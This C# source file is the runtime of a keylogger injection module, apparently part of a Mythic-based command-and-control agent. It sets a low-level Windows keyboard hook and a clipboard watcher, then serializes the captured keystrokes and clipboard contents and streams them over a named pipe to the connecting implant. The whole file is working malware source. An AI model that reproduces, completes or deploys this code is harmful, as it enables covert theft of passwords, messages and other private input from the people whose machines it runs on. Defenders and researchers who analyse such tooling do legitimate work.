using System;
using System.Text;
using PhantomInterop.Classes.Collections;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Serializers;
using ST=System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using static KeylogInject.Native;
using System.Collections.Concurrent;
using PhantomInterop.Classes;
using System.IO.Pipes;
using PhantomInterop.Interfaces;
using PhantomInterop.Constants;
using PhantomInterop.Structs.MythicStructs;

namespace KeylogInject
{
    class Runtime
    {
        private static string _namedPipeName;
        private static ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private static AsyncNamedPipeServer _server;
        private static AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private static CancellationTokenSource _cts = new CancellationTokenSource();

        private static ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
        private static bool _isFinished = false;
        private static AutoResetEvent _completeEvent = new AutoResetEvent(false);
        private static JsonHandler _dataSerializer = new JsonHandler();
       

        private static ST.Task _sendTask = null;
        private static Action<object> _transmitAction = null;

        private static ST.Task _flushTask = null;
        private static Action _flushAction = null;

        private static IntPtr _hookIdentifier = IntPtr.Zero;
        private static Thread _appRunThread;

        static void Main(string[] args)
        {
#if DEBUG
            _namedPipeName = "keylogtest";
#else
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];
#endif
            _transmitAction = new Action<object>((object p) =>
            {
                PipeStream ps = (PipeStream)p;
                WaitHandle[] waiters = new WaitHandle[]
                {
                    _completeEvent,
                    _msgSendEvent
                };
                while (!_isFinished && ps.IsConnected)
                {
                    WaitHandle.WaitAny(waiters, 1000);
                    if (_msgSendQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, ps);
                    }
                }
                ps.Close();
            });
            _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
            _server.ConnectionEstablished += OnAsyncConnect;
            _server.Disconnect += ServerDisconnect;

            _completeEvent.WaitOne();
        }

        private static void StartKeylog()
        {
            ClipboardNotification.LogMessage = AddToSenderQueue;
            Keylogger.LogMessage = AddToSenderQueue;
            Thread t = new Thread(() => Application.Run(new ClipboardNotification()));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            Keylogger.HookIdentifier = SetHook(Keylogger.HookCallback);
            Application.Run();
        }

        private static void ServerDisconnect(object sender, PipeMessageData e)
        {
            UnhookWindowsHookEx(Keylogger.HookIdentifier);
            _isFinished = true;
            _cts.Cancel();
            Application.Exit();
            _completeEvent.Set();
        }

        private static bool AddToSenderQueue(ICommandMessage msg)
        {
            DataChunk[] parts = _dataSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
            foreach (DataChunk part in parts)
            {
                _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_dataSerializer.Serialize(part)));
            }
            _msgSendEvent.Set();
            return true;
        }

        private static void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
            // Potentially delete this since theoretically the sender Task does everything
            if (_msgSendQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
            }
        }

        public static void OnAsyncConnect(object sender, PipeMessageData args)
        {
            // We only accept one connection at a time, sorry.
            if (_sendTask != null)
            {
                args.Pipe.Close();
                return;
            }
            _sendTask = new ST.Task(_transmitAction, args.Pipe);
            _sendTask.Start();
            Thread t = new Thread(StartKeylog);
            t.Start();
        }
    }
}
